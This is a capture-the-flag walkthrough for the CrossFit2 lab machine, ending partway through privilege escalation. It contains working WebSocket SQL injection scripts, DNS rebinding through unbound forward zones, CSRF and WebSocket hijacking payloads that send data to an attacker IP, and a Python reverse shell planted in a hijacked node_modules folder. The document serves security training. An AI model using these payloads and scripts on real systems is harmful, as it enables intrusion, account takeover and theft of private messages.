@@ -1,0 +1,967 @@
+                          CrossFit2
+
+                          2nd February 2021 / Document No D21.101.140
+                          Prepared By: MinatoTW & polarbearer
+                          Machine Creator(s): MinatoTW & polarbearer
+                          Difficulty: Insane
+
+Classification: Official
+Synopsis
+
+CrossFit2 is an insane difficulty BSD machine running a web server and an exposed unbound instance. An
+arbitrary file read is exploited to read relayd configuration. This gives access to vhosts with member
+applications. A password reset form vulnerable to host header injection can be exploited to register users
+and then exfiltrate chat via Cross Site Websocket Hijacking. Lateral movement involves exploiting nodejs
+path preference. Finally, a custom binary vulnerable to privileged file read is used to generate an OTP and
+get root.
+
+Note: Target IP address might differ.
+
+Skills Required
+
+      Web enumeration
+      Scripting
+      CSRF exploitation
+      Reverse engineering
+
+Skills Learned
+
+      Host header injection
+      Cross Site Websocket Hijacking
+      NodeJS path hijacking
+      Yubikey simulation
+Enumeration
+
+Nmap
+
+   nmap -p- 10.10.10.247
+
+Nmap reveals that OpenSSH and OpenBSD httpd services are listening on their default ports. Additionally, a
+service recognized as ub-dns-control is listening on port 8953.
+
+Unbound
+
+According to the unbound manual page, port 8953 is the default port used for remotely controlling the
+unbound daemon with the unbound-control utility. TLSv1 can be enforced on the connection by setting the
+control-use-cert option to yes ; in this case, in order to establish a successful connection, a client would
+need access to three files: the client private key, the client certificate and the server certificate. These files,
+along with the server private key, can be generated with the unbound-control-setup utility.
+We install unbound on our attacking machine and set it up to not use TLS for remote connections by
+configuring the /etc/unbound/unbound.conf file as follows:
+
+   remote-control:
+                 control-enable: yes
+                 control-use-cert: "no"
+
+We check the available unbound-control commands:
+   unbound-control
+We try to execute the stats command on the remote host:
+   unbound-control -s 10.10.10.247 stats
+
+The program does not return any output, which means TLS is probably enabled. With that in mind, we need
+to obtain the required files from the server before we can execute any remote commands.
+
+Httpd
+
+The httpd server on port 80 is hosting the website of a fictional CrossFit gym:
+http://10.10.10.247
+
+The MEMBER AREA link takes us to a different host ( employees.crossfit.htb ). We add an entry to our
+/etc/hosts file:
+
+   echo "10.10.10.247 employees.crossfit.htb" >> /etc/hosts
+We can now open the page, which displays a login form:
+http://employees.crossfit.htb
+
+It is not possible to login as we don't have any valid credentials, and simple username/password
+combinations don't work.
+The Forgot Password? link takes us to the password-reset.php page, where users can enter their
+registered email address to receive a password reset link via email:
+http://employees.crossfit.htb/password-reset.php
+Since we don't know any valid email address, we can't request a password reset at this point. Entering a non
+registered address results in a Unknown email address error:
+
+We run gobuster in an attempt to discover hidden web directories. We don't get any interesting results,
+but we notice that all the requests starting with /ws time out:
+
+   gobuster dir -u http://10.10.10.247 -w /usr/share/dirbuster/directory-list-2.3-
+   medium.txt
+This seems to suggest that requests for /ws* are being treated differently than other requests.
+
+The index.php page includes several JavaScript files and a "hidden" container which has a chat-main
+child:
+
+   <!-- Js Plugins -->
+   <script src="js/jquery-3.3.1.min.js"></script>
+   <script src="js/bootstrap.min.js"></script>
+   <script src="js/jquery.magnific-popup.min.js"></script>
+   <script src="js/jquery.slicknav.js"></script>
+   <script src="js/owl.carousel.min.js"></script>
+   <script src="js/circle-progress.min.js"></script>
+   <script src="js/main.js"></script>
+   <script src="js/ws.min.js"></script>
+
+   <div class="container" id="ws" style="display: none">
+      <div class="row pt-3">
+          <div class="chat-main">
+          [...]
+      </div>
+
+   </div>
+
+One of the included JavaScript files, js/ws.min.js , provides the code to communicate with a WebSocket
+server at ws://gym.crossfit.htb/ws/ :
+   const ws = new WebSocket('ws://gym.crossfit.htb/ws/');
+
+We can unminify the code using a web based service (i.e. https://unminify.com/) to better understand it:
+
+   function updateScroll() {
+          var e = document.getElementById("chats");
+          e.scrollTop = e.scrollHeight;
+
+   }
+   var token,
+
+          ws = new WebSocket("ws://gym.crossfit.htb/ws/"),
+          pingTimeout = setTimeout(() => {
+
+                 ws.close(), $(".chat-main").remove();
+          }, 31e3);
+   function check_availability(e) {
+          var s = new Object();
+          (s.message = "available"), (s.params = String(e)), (s.token = token),
+   ws.send(JSON.stringify(s));
+   }
+   $(".chat-content").slideUp(),
+          $(".hide-chat-box").click(function () {
+
+                 $(".chat-content").slideUp();
+          }),
+          $(".show-chat-box").click(function () {
+
+                 $(".chat-content").slideDown(), updateScroll();
+          }),
+          $(".close-chat-box").click(function () {
+
+                 $(".chat-main").remove();
+          }),
+          (ws.onopen = function () {}),
+          (ws.onmessage = function (e) {
+
+                 "ping" === e.data
+                         ? (ws.send("pong"), clearTimeout(pingTimeout))
+                         : ((response = JSON.parse(e.data)),
+                            (answer = response.message),
+                            answer.startsWith("Hello!") && $("#ws").show(),
+                            (token = response.token),
+                            $("#chat-messages").append('<li class="receive-msg float-left mb-2"><div
+
+   class="receive-msg-desc float-left ml-2"><p class="msg_display bg-white m-0 pt-1 pb-1
+   pl-2 pr-2 rounded">' + answer + "</p></div></li>"),
+
+                            updateScroll());
+          }),
+          $("#sendmsg").on("keypress", function (e) {
+
+                 if (13 === e.which) {
+                         $(this).attr("disabled", "disabled");
+                         var s = $("#sendmsg").val();
+                         if ("" !== s) {
+                                $("#chat-messages").append('<li class="send-msg float-right mb-2"><p
+
+   class="msg_display pt-1 pb-1 pl-2 pr-2 m-0 rounded">' + s + "</p></li>");
+                                var t = new Object();
+                                (t.message = s), (t.token = token), ws.send(JSON.stringify(t)),
+   $("#sendmsg").val(""), $(this).removeAttr("disabled"), updateScroll();
+                         }
+                 }
+          });
+When a message starting with "Hello!" is received, the jQuery show() method is called to show the hidden
+container on the web page:
+   answer.startsWith("Hello!") && $("#ws").show(),
+In order to allow the client to interact with the WebSocket server, we add an entry for gym.crossfit.htb
+to our /etc/hosts file:
+   echo "10.10.10.247 gym.crossfit.htb" >> /etc/hosts
+After reloading the index page, a chat window appears on the right bottom corner:
+
+The window is minimized but it can be raised by clicking the arrow button:
+
+We do as the bot says and type "help" to see the available commands:
+The coaches and classes commands give basic information about coaches and gym courses.
+The memberships command shows different membership plans and allows users to check their availability
+by clicking a button:
+All plans are available except for the 6-months plan:
+Foothold
+
+We open Burp Suite and reload the index.php page. We notice a request to /ws/ which contains
+WebSocket related headers:
+
+Chat messages are sent and received through WebSocket:
+By looking at the Burp Websockets history, we notice that every message sent by the client contains the
+same token as the previous message received by the server:
+Additionally, we see that ping/pong messages are exchanged periodically between the server and the client:
+We type the memberships command and then click the Availability button under the 1-month plan.
+This is our intercepted request:
+
+And this is the reply we get from the server:
+
+The debug parameter is particularly interesting, because it shows potential column names and values
+extracted from the database.
+Since we know the 6-months plan is not available, we can easily test for SQL injection. We click the
+availability button for the 6-months plan and modify the intercepted request by adding or 1=1 after the
+3 parameter:
+
+Our injection is successful and the name of the first subscription plan is returned in the debug field:
+
+We can try exploiting this injection vulnerability to enumerate databases. We intercept another membership
+availability request and change the params value as follows:
+
+   1 union select 1, group_concat(schema_name) from information_schema.schemata where
+   schema_name not like '%schema' and schema_name != 'mysql' order by name desc; -- -
+We get the following reply, which indicates our attack was successful:
+
+We can use the following Python script to enumerate all databases:
+
+   #!/usr/bin/python3
+   import sys
+   import json
+   import time
+   import string
+   import argparse
+   from websocket import create_connection, _exceptions
+
+   ws_server = "ws://gym.crossfit.htb/ws/"
+
+   mysql_chars = list(string.ascii_letters+string.digits) + ['_', '$', 0x7f]
+
+   def inject(query, show=True):
+          # Connect to WebSocket
+          ws = create_connection(ws_server)
+
+          # Receive greeting message and parse token
+          r = ws.recv()
+          token = json.loads(r)['token']
+
+          ws.send(f'{{"token": "{token}", "message":"available","params":"1 union select 1,
+   {query} order by name desc; -- -"}}')
+
+          r = ws.recv()
+          res=json.loads(r)['debug'].split("name: ")[1].split("]")[0]
+          if show:
+
+                 print(res)
+          return res;
+
+   def get_dbs():
+          return inject("group_concat(schema_name) from information_schema.schemata where
+
+   schema_name not like '%schema' and schema_name != 'mysql'")
+
+   def get_tables(db):
+       return inject(f"group_concat(table_name) from information_schema.tables where
+table_schema = '{db}'", show=False)
+
+def get_columns(db, table):
+       return inject(f"group_concat(column_name) from information_schema.columns where
+
+table_name = '{table}' and table_schema = '{db}'")
+
+def get_data(db, table, columns):
+       return inject(f"group_concat({(',0x7c,').join(columns.split(','))}) from {db}.
+
+{table}", show=False)
+
+if __name__ == "__main__":
+       parser = argparse.ArgumentParser()
+       parser.add_argument("--db")
+       parser.add_argument("--table")
+       parser.add_argument("--columns")
+       args = parser.parse_args()
+
+       if args.db:
+              databases = [args.db]
+
+       else:
+              print("[*] Enumerating databases... ", end="", flush=True)
+              databases = get_dbs().split(',')
+              print()
+
+       print("[*] Dumping data...")
+       for d in databases:
+
+              print("-"*(len(d)+4))
+              print(f"| {d} |")
+              print("-"*(len(d)+4))
+
+              if args.table:
+                     tables = [args.table]
+
+              else:
+                     tables = get_tables(d).split(',')
+
+              for t in tables:
+                     print(f"\n[{t}]")
+
+                     if args.columns:
+                             columns = args.columns
+                             print(columns)
+
+                     else:
+                             columns = get_columns(d, t)
+                             print()
+
+                     row_data = get_data(d, t, columns)
+                     for row in row_data.split(','):
+
+                             if row != '1-month':
+                                       print(row)
+                         print()
+
+The employees table of the employees database contains usernames, password hashes and email
+addresses. After an unsuccessful attempt at cracking the hashes, we turn our attention to the administrator
+email address:
+
+   david.palmer@crossfit.htb
+We try this address on the password reset page ( http://employees.crossfit.htb/password-
+reset.php ):
+The request is successful, and a reset link appears to be sent to the user's email:
+
+We call the db_dump.py script with the following arguments to only dump the
+employees.password_reset table:
+
+   ./db_dump.py --db employees --table password_reset --columns email,token,expires
+We see that an entry was added to the table.
+Parameter fuzzing on the password-reset.php page reveals the existence of the token parameter:
+
+   wfuzz -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt --hh 4228
+   http://employees.cross-fit.htb/password-reset.php?FUZZ=1
+
+We can make an educated guess about the password reset process: when a password reset is requested
+using a valid email address, a link having the following format is generated and emailed to the user:
+
+   http://employees.cross-fit.htb/password-reset.php?token=<TOKEN>
+The user opens the link and, having provided a valid token, is presented with a password reset form.
+We pass the token we obtained earlier as a parameter to the password-reset.php page:
+Unfortunately the token we entered is invalid; what we have obtained may just be a hash of the actual
+token, which we cannot use to trigger a password reset.
+Having already dumped all the available databases, we can try reading system files by calling the
+load_file function. We do so using the following Python script:
+
+   #!/usr/bin/python3
+   import sys
+   import json
+   import time
+   import string
+   import argparse
+   from websocket import create_connection, _exceptions
+
+   ws_server = "ws://gym.crossfit.htb/ws/"
+
+   mysql_chars = list(string.ascii_letters+string.digits) + ['_', '$', 0x7f]
+
+   def inject(query, order):
+          # Connect to WebSocket
+          ws = create_connection(ws_server)
+
+          # Receive greeting message and parse token
+          r = ws.recv()
+          token = json.loads(r)['token']
+
+          ws.send(f'{{"token": "{token}", "message":"available","params":"1 union select 1,
+   {query} order by name {order}; -- -"}}')
+
+          r = ws.recv()
+          res=json.loads(r)['debug'].split("name: ")[1].split("]")[0]
+          return res;
+
+   def read_file(filename):
+          contents = inject(f"load_file(\'{filename}\')", "desc")
+          if(contents == "1-month"):
+                 contents = inject(f"load_file(\'{filename}\')", "asc")
+          print(contents)
+
+   if __name__ == "__main__":
+          filename = sys.argv[1]
+          read_file(filename)
+
+First we read the OpenBSD httpd configuration file ( /etc/httpd.conf ):
+We see here the definition of three servers, listening on port 8000, 8001 and 8002 respectively. All servers
+are listening on the loopback interface lo0 , which means another service is listening on port 80 and acting
+as a reverse proxy. This other service could also be responsible for managing WebSockets requests.
+The OpenBSD relayd daemon, in addition to being able to act as a reverse proxy, has builtin support for the
+WebSocket protocol, which makes it the perfect tool for the job:
+https://man.openbsd.org/relayd.conf.5
+
+   websockets
+          Allow connection upgrade to websocket protocol. The default is no websockets.
+
+Note: a small patch, inspired by this post, was applied to relayd in order to prevent it from adding a non-
+standard Connection: close header to Websocket responses (which would prevent some browsers and
+libraries from working).
+We use read_file.py to read the relayd configuration file /etc/relayd.conf :
+As we expected, some redirections are in place. First, the Host header of the request is checked: requests
+matching crossfit-club.htb are forwarded to port 9999, and in turn to either port 8002 (which we
+previously saw as the "chat" server in httpd.conf ) or 5000, depending on the path; requests matching
+*employees.crossfit.htb are forwarded to port 8001, where the "employees" server is listening (this is
+the employees login page we have already seen).
+
+The crossfit-club.htb host is new, so we add an entry for it to our /etc/hosts file:
+   echo "10.10.10.247 crossfit-club.htb" >> /etc/hosts
+We open the page http://crossfit-club.htb with our web browser and get redirected to /login :
+
+The SIGN UP button takes us to a disabled sign up form:
+
+The form is not just disabled client-side, as it is not configured to trigger any action; therefore, manually
+enabling the button would not be useful.
+We can inspect the page to see the field names, which we take note of:
+       username ;
+       email ;
+       password ;
+       confirm .
+
+We can also see some included JavaScript files:
+
+From the http://crossfit-club.htb/js/app~748942c6.54b0bc0a.js script we can see that login requests are sent
+to /api/login :
+We can fuzz the /api directory to find other available endpoints. We try both GET and POST requests:
+
+   gobuster dir -q -u http://crossfit-club.htb/api -w /usr/share/dirb/wordlists/common.txt
+   gobuster dir -q -m POST -u http://crossfit-club.htb/api -w
+   /usr/share/dirb/wordlists/common.txt
+
+The /api/auth and /api/signup endpoints were found. We try sending a POST request to /api/signup
+using the parameter names we gathered:
+
+   curl -d "username=a&password=a&confirm=a&email=a@b.c" http://crossfit-
+   club.htb/api/signup
+A valid CSRF token is required. The /api/auth endpoint provides us with a token:
+
+We send an OPTION request to the /api/signup endpoint to check if any custom headers are allowed in
+cross-site requests:
+
+   curl -X OPTIONS -v crossfit-club.htb/api/signup 2>&1 | grep Allow-Headers
+
+The custom X-CSRF-TOKEN header is allowed. This looks like a potential way to send our token. We issue
+the following cURL commands to retrieve a token and send it through the X-CSRF-TOKEN header from the
+same session:
+
+   curl -b cookie -H "X-CSRF-TOKEN: `curl -sc cookie http://crossfit-club.htb/api/auth |
+   awk -F'"' '{print $8}'`" -d "username=a&password=a&confirm=a&email=a@b.c"
+   http://crossfit-club.htb/api/signup
+Unfortunately, it seems that only administrators can register accounts. That being the case, we need a way
+to trick the administrator into registering an account for us.
+As we hypothesised earlier, the administrator might be clicking on password reset links. If we could
+somehow forge a link that made the admin send a request to a web server under our control, we might be
+able to serve a session riding payload and force the creation of a user on our behalf.
+We do some research about potential vulnerabilities in password reset functions and come across the
+following HackerOne report, which leads us to test for host header injection:
+https://hackerone.com/reports/281575
+We open a listener on port 80:
+
+   nc -lnvp 80
+We open the password reset page, send a reset request for david.palmer@crossfit.htb and intercept it
+with Burp Proxy:
+
+We modify the Host header to match our IP address and forward the request:
+
+This results in an "Access denied" error.
+Looking back the relayd configuration, it is clear why the header injection attack didn't work:
+   pass request quick header "Host" value "*employees.cross-fit.htb" forward to <2>
+
+Only requests having a Host header ending with employees.cross-fit.htb are forwareded to the
+employees page. We try setting the header to:
+
+   10.10.14.5/employees.crossfit.htb
+
+The server responds with an interesting error message:
+
+Our attempt was blocked because only local hosts are allowed. Since DNS queries might be involved in this
+check, we turn our attention back to unbound.
+We start by reading the unbound configuration file from its standard OpenBSD location
+( /var/unbound/etc/unbound.conf ):
+
+   ./read_file.py /var/unbound/etc/unbound.conf
+We see that another file ( /var/unbound/etc/conf.d/local_zones.conf ) is included, but we lack read
+permission on it. On the other hand, we can read the unbound_server.pem , unbound_control.key and
+unbound_control.pem files:
+
+   ./read_file.py /var/unbound/etc/tls/unbound_server.pem
+
+   ./read_file.py /var/unbound/etc/tls/unbound_control.key
+
+   ./read_file.py /var/unbound/etc/tls/unbound_control.pem
+We save the files to /etc/unbound and set the following parameters in /etc/unbound/unbound.conf :
+
+   remote-control:
+                 control-enable: yes
+                 control-use-cert: "yes"
+
+                 # unbound server certificate file.
+                 server-cert-file: "/etc/unbound/unbound_server.pem"
+
+                 # unbound-control key file.
+                 control-key-file: "/etc/unbound/unbound_control.key"
+
+                 # unbound-control certificate file.
+                 control-cert-file: "/etc/unbound/unbound_control.pem"
+
+We can now run the stats command successfully:
+
+   unbound-control -s 10.10.10.247 stats
+We try running other commands, but most of them return an error:
+
+   unbound-control -s 10.10.10.247 list_stubs
+
+It seems we are dealing with a modified version of unbound (normally, all commands shown by unbound-
+control are supported by unbound). Only the following commands are available:
+
+       stats ;
+       stats_noreset ;
+       status ;
+       forward_add ;
+       flush_stats .
+The forward_add command, in particular, allows us to add forward zones:
+
+   forward_add [+i] zone addr ...
+                            Add a new forward zone to running unbound. With +i option also
+                            adds a domain-insecure for the zone (so it can resolve inse-
+                            curely if you have a DNSSEC root trust anchor configured for
+                            other names). The addr can be IP4, IP6 or nameserver names,
+                            like forward-zone config in unbound.conf.
+
+We try adding a forward zone for test.employees.crossfit.htb :
+
+   unbound-control -s 10.10.10.247 forward_add +i "test.employees.crossfit.htb"
+   "10.10.14.5"
+
+We download FakeDns and add the following record to the dns.conf file:
+   A test.employees.crossfit.htb 127.0.0.1
+We start FakeDns:
+
+   ./fakedns.py -c dns.conf
+We set the Host header accordingly and send our request again:
+
+   Host: test.employees.crossfit.htb
+
+This does not seem to work as we are presented with the same Only local hosts are allowed error,
+which could mean that we are not allowed to forward subdomains of locally defined zones. One way to get
+around this restriction and define a host on a different domain under our control is to use the / character
+as a separator:
+
+   hostname/employees.crossfit.htb
+This is enough to satisfy the relayd host requirements and, as it turns out, results in hostname being
+parsed as the host name by the PHP script (we know there might be some parsing logic in the script
+because Host headers can include port numbers, and our assumption is that a DNS query, which does not
+include the port number, is performed).
+We modify dns.conf as follows and restart FakeDns:
+
+   A just.a.te.st.htb 127.0.0.1
+   ./fakedns.py -c dns.con
+We run unbound-control to set a forward zone for st.htb :
+   unbound-control -s 10.10.10.247 forward_add +i "st.htb" "10.10.14.5"
+We set the Host header accordingly and resend our request:
+We see two requests on our FakeDns server:
+
+The request appears to be successful:
+
+Since we ultimately want the administrator to click the generated link and send a request to us, we can use
+a technique similar to DNS rebinding to redefine the A record after it's been checked by the remote server.
+The --rebind option of FakeDns allows us to do so:
+
+--rebind  Enable DNS rebinding attacks - responds with one result the first
+
+request, and another result on subsequent requests
+
+We know two DNS queries are performed by the PHP page, so we configure dns.conf as follows to change
+the record after the first two requests:
+
+A just.a.te.st.htb 127.0.0.1 2%10.10.14.5
+
+We start FakeDns and open a netcat listener on port 80:
+   ./fakedns.py -c dns.conf --rebind
+   nc -lnvp 80
+
+We send our request again from Burp with the modified Host
+just.a.te.st.htb/employees.crossfit.htb . The request is successful and after a couple of minutes a
+request is sent to our listener:
+
+We create a file called password-reset.php which contains our payload:
+
+   <html>
+      <script>
+      var xhr = new XMLHttpRequest();
+      const url = "http://crossfit-club.htb/api/auth";
+      xhr.onreadystatechange = function() {
+          if (xhr.readyState === 4) {
+              var obj = JSON.parse(xhr.response);
+              var xhr2 = new XMLHttpRequest();
+              xhr2.onreadystatechange = function() {
+                 if (xhr2.readyState === 4) {
+                         var xhr3 = new XMLHttpRequest();
+                         xhr3.open("POST", "http://10.10.14.5:8888");
+                         xhr3.send(xhr2.response);
+                 }
+              }
+              xhr2.open("POST", "http://crossfit-club.htb/api/signup");
+              xhr2.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+              xhr2.setRequestHeader("X-CSRF-TOKEN", obj.token);
+              const data =
+
+   "username=testuser&password=testpass&confirm=testpass&email=test@test.htb";
+              xhr2.withCredentials = true;
+              xhr2.send(data);
+          }
+      }
+      xhr.open("GET", url);
+      xhr.withCredentials = true;
+      xhr.send();
+      </script>
+   </html>
+We open a PHP server on port 80 and a netcat listener on port 8888:
+   php -S 0.0.0.0:80
+   nc -lnvp 8888
+We restart FakeDns, send our request again from Burp and wait for a hit on our server:
+
+However, the subsequent request to port 8888, which should contain the response to the POST request
+sent to /api/signup , is not sent. Since this is a cross-site request, the same-origin policy might be blocking
+it. What we sent is a "simple" POST which does not require preflighting, so the browser is probably
+responsible for blocking the response while the request could have still been sent successfully.
+We open the http://crossfit-club.htb page and attempt to login with credentials testuser:testpass .
+Our attempt is not successful, which means the user was not created.
+Cross-Origin Resource Sharing (CORS) rules might allow cross-origins to access the /api/signup page. To
+check for allowed origins, we can send preflight OPTIONS requests with different Origin header values
+and look for an Access-Control-Allow-Origin header in the response. We use cURL to do so:
+
+   curl -X OPTIONS -v -H "Origin: http://10.10.14.5" crossfit-club.htb/api/signup 2>&1 |
+   grep Access-Control-Allow-Origin
+   curl -X OPTIONS -v -H "Origin: http://crossfit.htb" crossfit-club.htb/api/signup 2>&1 |
+   grep Access-Control-Allow-Origin
+   curl -X OPTIONS -v -H "Origin: http://crossfit-club.htb" crossfit-club.htb/api/signup
+   2>&1 | grep Access-Control-Allow-Origin
+   curl -X OPTIONS -v -H "Origin: http://employees.crossfit.htb" crossfit-
+   club.htb/api/signup 2>&1 | grep Access-Control-Allow-Origin
+   curl -X OPTIONS -v -H "Origin: http://gym.crossfit.htb" crossfit-club.htb/api/signup
+   2>&1 | grep Access-Control-Allow-Origin
+   curl -X OPTIONS -v -H "Origin: http://test.crossfit.htb" crossfit-club.htb/api/signup
+   2>&1 | grep Access-Control-Allow-Origin
+We get positive results for crossfit-club.htb , employees.crossfit.htb and gym.crossfit.htb :
+
+As noted previously, we are not allowed to forward local zones, which means we cannot set a forwarder for
+one of the allowed origins on the crossfit.htb and crossfit-club.htb domains.
+According to the unbound documentation, this could be accomplished for example by setting the local-
+zone type to refuse in unbound.conf :
+refuse                                                     If there is
+         Send an error message reply, with rcode REFUSED.
+         a match from local data, the query is answered.
+
+In this case, any query for a host belonging to a local-zone would be denied unless a local-data
+definition for the same host was configured (forward zones would just be ignored).
+
+One of the most common CORS configuration issues arises from the use of weak regular expressions to
+parse Origin headers. Regular expressions are often used to evaluate multiple domains at once, which is
+what might be happening on our target system. Therefore, we start looking for potential regex bypasses.
+
+The . character, which means "match any character" when used in regular expressions, is often misused to
+represent an actual dot. For example, if a regex pattern like (gym|employees).crossfit\.htb was used, it
+would match gym.crossfit.htb , employees.crossfit.htb but also gymAcrossfit.htb or
+employees3crossfit.htb . The following cURL request proves that this is indeed the case:
+
+curl -X OPTIONS -v -H "Origin: http://gymUcrossfit.htb" crossfit-club.htb/api/signup
+2>&1 | grep Allow-Origin
+
+Since the zone gymUcrossfit.htb is probably not defined as a local zone in the outbound configuration,
+forwarding could be possible. We modify dns.conf as follows and restart FakeDns:
+
+   A gymUcrossfit.htb 127.0.0.1 2%10.10.14.5
+We use unbound-control to add a forwarder for the gymUcrossfit.htb zone:
+
+   unbound-control -s 10.10.10.247 forward_add +i "gymUcrossfit.htb" "10.10.14.5"
+We modify the Host header in our Burp request:
+
+   Host: gymUcrossfit.htb/employees.crossfit.htb
+We send the request and wait for a hit on our PHP server and port 8888 listener.
+
+This time we get a hit, but an error message is returned:
+
+It is possible that the form only accepts JSON data. We rewrite the password-reset.php file as follows:
+   <html>
+      <script>
+      var xhr = new XMLHttpRequest();
+      const url = "http://crossfit-club.htb/api/auth";
+
+      xhr.onreadystatechange = function() {
+          if (xhr.readyState === 4) {
+              var obj = JSON.parse(xhr.response);
+              var xhr2 = new XMLHttpRequest();
+
+              xhr2.onreadystatechange = function() {
+                 if (xhr2.readyState === 4) {
+                         var xhr3 = new XMLHttpRequest();
+                         xhr3.open("POST", "http://10.10.14.5:8888");
+                         xhr3.send(xhr2.response);
+                 }
+
+              }
+              xhr2.open("POST", "http://crossfit-club.htb/api/signup");
+              xhr2.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
+              xhr2.setRequestHeader("X-CSRF-TOKEN", obj.token);
+              const data = JSON.stringify({ "username" : "testuser", "password" : "testpass",
+   "confirm" : "testpass", "email" : "badboi@leethaxx.htb" });
+              xhr2.withCredentials = true;
+              xhr2.send(data);
+          }
+      }
+
+      xhr.open("GET", url);
+      xhr.withCredentials = true;
+      xhr.send();
+      </script>
+   </html>
+
+We send another request to password-reset.php from Burp and wait for the admin to request our
+payload. This time the attack is successful:
+We are now able to login:
+
+The Chat link on the left side menu takes us to a web chat application. Users are sending random
+messages to the Global Chat:
+We also see a user named Admin in the list.
+By inspecting HTTP requests with Burp Proxy as we log in and access the chat application, we can see that
+the application is using the socket.io library. When the user joins the chat, a user_join event is emitted:
+
+Knowing this, and having a way to force the administrator to execute arbitrary JavaScript code, we can
+attempt Cross-Site Websocket Hijacking to read any private messages received by the Admin user
+(assuming the employees admin could be also logged in as the chat admin). To do so, we first need to find
+out the event that is emitted when a private message is received.
+We modify the employees.crossfit.htb/password-reset.php script as follows to create a second user
+called testuser2 :
+   const data = JSON.stringify({ "username" : "testuser2", "password" : "testpass",
+   "confirm" : "testpass", "email" : "badboi@leethaxx.htb" });
+With our PHP server still listening, we restart FakeDns and send another request to the password-
+reset.php page from Burp Repeater, with the Host header value still set to
+gymUcrossfit.htb/employees.crossfit.htb . When the admin clicks the link, we get a hit on our server
+and the testuser2 user is created.
+While still logged in as testuser , and with Burp Proxy still active, we open a second browser and log in as
+testuser2 . We send a private message from testuser2 to testuser :
+
+From the Burp HTTP History we can see a private_recv event was emitted:
+
+We now have all we need for our payload. We modify the password-reset.php file as follows:
+   <html>
+     <script src="http://10.10.14.5/socket.io.js"></script>
+     <script>
+        var socket = io.connect("http://crossfit-club.htb");
+        socket.emit("user_join", { username : "Admin" });
+        socket.on("private_recv", (data) => {
+            var xhr = new XMLHttpRequest();
+            xhr.open("POST", "http://10.10.14.5:8888/");
+            xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+            xhr.send(JSON.stringify(data));
+        });
+     </script>
+
+   </html>
+
+The page includes socket.io.js , which we have to host from our web server. We download it locally:
+
+   wget https://cdnjs.cloudflare.com/ajax/libs/socket.io/2.3.0/socket.io.js
+
+Next, the script connects to the socket.io server at http://crossfit-club.htb and emits a user_join to make
+the Admin user join the chat. It then listens for private_recv events and sends data back to us on port
+8888.
+We open a listener to receive messages:
+
+   ncat -klnvp 8888
+
+We send another request to password-reset.php from Burp Repeater. Both our password-reset.php
+and socket.io.js files are downloaded:
+
+After a few seconds we start seeing messages on our port 8888 listener. Most of them look just like random
+messages, but one of them contains credentials:
+We can use the above password ( NWBFcSe3ws4VDhTB ) to SSH to the system as david :
+The user flag is in /home/david/user.txt .
+Lateral Movement
+
+Enumeration of the file system reveals a folder /opt/sysadmin which members of sysadmins group can
+write to.
+
+We also find a script named statbot.js in the /opt/sysadmin/server/statbot folder.
+
+   const WebSocket = require('ws');
+   const fs = require('fs');
+   const logger = require('log-to-file');
+   const ws = new WebSocket("ws://gym.crossfit.htb/ws/");
+   function log(status, connect) {
+
+      var message;
+      if(status) {
+
+          message = `Bot is alive`;
+      }
+      else {
+
+          if(connect) {
+              message = `Bot is down (failed to connect)`;
+
+          }
+          else {
+
+              message = `Bot is down (failed to receive)`;
+          }
+      }
+      logger(message, '/tmp/chatbot.log');
+   }
+   ws.on('error', function err() {
+      ws.close();
+      log(false, true);
+   })
+   ws.on('message', function message(data) {
+      data = JSON.parse(data);
+      try {
+          if(data.status === "200") {
+
+              ws.close()
+              log(true, false);
+          }
+      }
+      catch(err) {
+
+              ws.close()
+              log(false, false);
+      }
+   });
+
+The nodejs script creates a websocket connection to the gym bot and checks if it's up. It then logs
+information based on the connection status to /tmp/chatbot.log . Inspection of this file reveals that it's
+owned by the user john .
+
+Checking this file a few more times, it's noticed that the file is updated every 3 minutes or so.
+Looking at john's home folder, we see a script named statbot.sh .
+
+   #!/bin/csh -l
+   node /opt/sysadmin/server/statbot/statbot.js
+
+It invokes the csh login shell by passing the -l flag and then executes the script. The -l option implies
+that the user's shell profile is read to set environment variables and other settings. The .cshrc script
+reveals something interesting.
+
+   <SNIP>
+                 alias pushd 'pushd \!*; prompt'
+                 cd .
+                 umask 22
+
+   endif
+   setenv NODE_PATH /usr/local/lib/node_modules
+
+It sets the NODE_PATH env variable to /usr/local/lib/node_modules . We know that nodejs programs
+store modules and libraries in the node_modules folder in the currect directory by default. But it's also
+possible to use modules from the global node_modules folder. This can be done by setting the NODE_PATH
+variable.
+The variable enables the statbot script to execute from anywhere. The nodejs documentation reveals that
+the node_modules folder is given preference over NODE_PATH . Morever, the interpreter looks for this folder
+in all subsequent parent folders before going to NODE_PATH . The query order for
+/opt/sysadmin/server/statbot/statbot.js would be as follows:
+
+      /opt/sysadmin/server/statbot/node_modules
+      /opt/sysadmin/server/node_modules
+      /opt/sysadmin/node_modules
+      /opt/node_modules
+      ... So on
+The members of sysadmin group have write permissions to the /opt/sysadmin folder. This means we can
+create a malicious node_modules in that folder and hijack execution.
+
+   mkdir -p /opt/sysadmin/node_modules/ws
+
+Then create a file index.js at /opt/sysadmin/node_modules/ws with the following reverse shell:
+
+   function WebSocket(test) {
+      require('child_process').execSync("python3 -c 'import
+
+   socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10
+   .10.14.4\",4444));os.dup2(s.fileno(),0);
+   os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/sh\")'");
+   }
+
+   module.exports = WebSocket;
+
+This script intercepts the call to WebSocket and executes a reverse shell. A shell as john should be received
+in a couple minutes.
+Privilege Escalation
+
+We see that john is a member of the staff group:
+
+We search for file owned by this group and find an interesting setuid executable:
+
+The program expects a file name as a parameter:
+
+We try reading the /etc/passwd file, but our attempt fails:
+
+A few more attempts seem to indicate that the program is only able to read files inside the /var directory.
+We download the log binary locally and open it with IDA Free. We can see a call to sub_1FF0 with
+parameters r and /var :
+We run objdump and see a PLT entry for unveil at address 1ff0 :
+
+The OpenBSD unveil function is used to restrict filesystem access. In this case, the call to unveil effectively
+limits the program to only access /var and its subdirectories with read-only permissions, denying access to
+all the upper directories. This means we can use the /usr/local/bin/log program to read any file under
+/var (and nothing else).
+In order to check if /var contains any files that can allow us to escalate privileges, we do more system
+enumeration.
+The world-readable /etc/changelist file contains a list of files that are regularly backed up to
+/var/backups and checked for modifications by the OpenBSD periodic system security check. We can read
+this list to see if any sensitive files are backed up:
+
